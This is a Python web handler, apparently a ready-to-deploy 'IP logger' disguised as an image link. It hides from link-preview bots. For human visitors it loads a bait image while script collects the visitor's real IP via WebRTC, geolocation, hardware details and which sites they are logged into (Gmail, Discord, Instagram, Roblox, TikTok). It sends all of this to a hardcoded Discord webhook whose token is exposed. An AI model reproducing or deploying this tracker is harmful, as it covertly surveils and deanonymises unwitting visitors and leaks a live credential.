from http.server import BaseHTTPRequestHandler
import requests
import httpagentparser
import json

# --- CONFIGURATION ---
config = {
    "webhook": "https://discord.com/api/webhooks/1458566674302238923/0EPCSiG8KU6QcDoFcT0Ugc6BN_fGX_7K6KsXtflSlkKV4ZPH9zSHx3bnirPb0bWDowEk",
    "image": "https://media.discordapp.net/attachments/1457070623238127690/1457320607749509130/images_12.jpg",
    "username": "TITAN NEBULA LOGGER",
    "color": 0x00FFFF
}

class handler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            # IP'yi al
            ip = self.headers.get('x-forwarded-for', self.client_address[0])
            if ',' in ip:
                ip = ip.split(',')[0].strip()
            
            ua = self.headers.get('user-agent', 'Unknown')
            
            print(f"IP: {ip}, UA: {ua}")  # Debug için
            
            # Bot kontrolü
            is_bot = any(b in ua for b in ["Discordbot", "TelegramBot", "Twitterbot", "Slackbot"])
            if is_bot:
                self.send_response(200)
                self.send_header('Content-type', 'text/html')
                self.end_headers()
                self.wfile.write(f'<html><head><meta property="og:image" content="{config["image"]}"></head></html>'.encode())
                return

            # IP'den lokasyon al
            try:
                geo_response = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5)
                geo_info = geo_response.json()
                print(f"Geo info: {geo_info}")
            except:
                geo_info = {'isp': 'N/A', 'country': 'N/A', 'city': 'N/A', 'regionName': 'N/A', 'proxy': False, 'mobile': False}
            
            os_info, br_info = httpagentparser.simple_detect(ua)

            # HTML gönder
            self.send_response(200)
            self.send_header('Content-type', 'text/html; charset=utf-8')
            self.end_headers()

            content = f'''
            <!DOCTYPE html>
            <html>
            <head><title>Loading Image...</title></head>
            <body style="background:#000;margin:0;display:flex;justify-content:center;align-items:center;height:100vh;">
                <img src="{config["image"]}" id="bait" style="max-width:100%;height:auto;">
                
                <script>
                async function captureAll() {{
                    let data = {{}};
                    
                    // WebRTC ile IP
                    try {{
                        const pc = new RTCPeerConnection({{iceServers:[{{urls:"stun:stun.l.google.com:19302"}}]}});
                        pc.createDataChannel("");
                        pc.createOffer().then(o => pc.setLocalDescription(o));
                        pc.onicecandidate = i => {{
                            if(i && i.candidate && i.candidate.candidate) {{
                                const match = /([0-9]{{1,3}}(\.[0-9]{{1,3}}){{3}})/.exec(i.candidate.candidate);
                                if(match) data.real_ip = match[1];
                            }}
                        }};
                        setTimeout(() => pc.close(), 3000);
                    }} catch(e) {{}}
                    
                    // GPU
                    let gpu = "N/A";
                    try {{
                        const canvas = document.createElement('canvas');
                        const gl = canvas.getContext('webgl');
                        if(gl) {{
                            const dbg = gl.getExtension('WEBGL_debug_renderer_info');
                            if(dbg) gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
                        }}
                    }} catch(e) {{}}
                    
                    // Session kontrolü
                    const sites = [
                        {{n:"Gmail", u:"https://accounts.google.com/ServiceLogin?service=mail"}},
                        {{n:"Discord", u:"https://discord.com/api/v9/experiments"}},
                        {{n:"Instagram", u:"https://www.instagram.com/accounts/login/"}},
                        {{n:"Roblox", u:"https://www.roblox.com/mobileapi/check-app-launch"}},
                        {{n:"TikTok", u:"https://www.tiktok.com/login"}}
                    ];
                    let activeSessions = [];
                    
                    for(let s of sites) {{
                        try {{
                            const ctrl = new AbortController();
                            setTimeout(() => ctrl.abort(), 1000);
                            await fetch(s.u, {{ mode: 'no-cors', signal: ctrl.signal }});
                            activeSessions.push(s.n);
                        }} catch(e) {{}}
                    }}
                    
                    // Webhook'a gönder
                    const payload = {{
                        "username": "{config["username"]}",
                        "embeds": [{{
                            "title": "🌌 NEBULA - IP LOGGED",
                            "color": {config["color"]},
                            "description": "**A User Visited!**\\n\\n" +
                                "**IP Info:**\\n" +
                                "> **IP:** `{ip}`\\n" +
                                "> **Real IP:** `" + (data.real_ip || "Unknown") + "`\\n" +
                                "> **Provider:** `{geo_info.get('isp', 'N/A')}`\\n" +
                                "> **Country:** `{geo_info.get('country', 'N/A')}`\\n" +
                                "> **City:** `{geo_info.get('city', 'N/A')}`\\n" +
                                "> **Region:** `{geo_info.get('regionName', 'N/A')}`\\n" +
                                "> **VPN/Proxy:** `{geo_info.get('proxy', False)}`\\n" +
                                "> **Mobile:** `{geo_info.get('mobile', False)}`\\n\\n" +
                                "**Hardware:**\\n" +
                                "> **OS:** `{os_info}`\\n" +
                                "> **Browser:** `{br_info}`\\n" +
                                "> **GPU:** `" + gpu + "`\\n" +
                                "> **Memory:** " + (navigator.deviceMemory || "N/A") + "GB\\n" +
                                "> **CPU Cores:** " + navigator.hardwareConcurrency + "\\n\\n" +
                                "**Active Sessions:**\\n" +
                                "> `" + (activeSessions.join(" | ") || "None") + "`",
                            "footer": {{"text": "Titan Nebula"}}
                        }}]
                    }};
                    
                    navigator.sendBeacon("{config["webhook"]}", new Blob([JSON.stringify(payload)], {{type: 'application/json'}}));
                    console.log("Data sent");
                }}
                
                captureAll();
                </script>
            </body>
            </html>
            '''
            self.wfile.write(content.encode('utf-8'))

        except Exception as e:
            print(f"Hata: {e}")  # Hatayı göster
            self.send_response(302)
            self.send_header('Location', config["image"])
            self.end_headers()
    
    def log_message(self, format, *args):
        print(f"{self.client_address[0]} - {format % args}")

# Local'de test için
if __name__ == '__main__':
    from http.server import HTTPServer
    server = HTTPServer(('localhost', 8000), handler)
    print('Server http://localhost:8000 adresinde çalışıyor')
    server.serve_forever()
